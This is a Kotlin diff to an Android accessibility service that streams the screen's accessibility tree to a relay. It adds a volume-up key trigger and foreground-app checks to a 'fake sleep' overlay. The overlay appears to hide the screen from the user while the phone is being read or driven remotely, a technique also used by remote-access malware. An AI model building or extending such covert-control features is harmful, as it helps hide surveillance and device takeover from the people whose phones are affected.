@@ -10,6 +10,7 @@ import android.net.NetworkRequest
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
+import android.view.KeyEvent
 import android.view.accessibility.AccessibilityEvent
 import android.view.accessibility.AccessibilityNodeInfo
 
@@ -71,7 +72,9 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
         UserSession.setAccessibilityWasEnabled(this, true)
         fakeSleepOverlay = FakeSleepOverlay(this)
         instance = this
-        if (FakeSleepMode.isEnabled(this)) showFakeSleepOverlay()
+        if (FakeSleepMode.isEnabled(this)) {
+            if (isOwnAppForeground()) hideFakeSleepOverlay() else showFakeSleepOverlay()
+        }
         ProximityGuard.onServiceReady(this)
         runCatching { ensureRelay() }
     }
@@ -102,18 +105,20 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
                 val pkg = event.packageName?.toString().orEmpty()
                 val actTitle = event.text?.joinToString(" ")?.trim().orEmpty()
                 if (actTitle.isNotEmpty()) lastActivityTitle = actTitle
-                if (pkg.isEmpty()) return
-                if (!streaming) {
-                    lastWindowPkg = pkg
-                    return
-                }
-                if (pkg != lastWindowPkg) {
-                    lastWindowPkg = pkg
-                    TreeDiffer.reset()
-                    mainHandler.post { pushTreeNow(forceFull = true) }
-                } else {
-                    lastWindowPkg = pkg
-                    scheduleTreePush()
+                if (pkg.isNotEmpty()) {
+                    FakeSleepMode.onForegroundPackageChanged(this, pkg)
+                    if (!streaming) {
+                        lastWindowPkg = pkg
+                        return
+                    }
+                    if (pkg != lastWindowPkg) {
+                        lastWindowPkg = pkg
+                        TreeDiffer.reset()
+                        mainHandler.post { pushTreeNow(forceFull = true) }
+                    } else {
+                        lastWindowPkg = pkg
+                        scheduleTreePush()
+                    }
                 }
             }
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
@@ -135,6 +140,16 @@ class TouchAccessibilityService : AccessibilityService(), RelayClient.Listener {
     }
 
     override fun onInterrupt() {}
+
+    override fun onKeyEvent(event: KeyEvent): Boolean {
+        if (event.action != KeyEvent.ACTION_DOWN) return false
+        if (event.keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
+            return FakeSleepMode.onVolumeUp(this)
+        }
+        return false
+    }
+
+    fun isOwnAppForeground(): Boolean = lastWindowPkg == packageName
 
     fun ensureRelay() {
         RelayHub.live = true
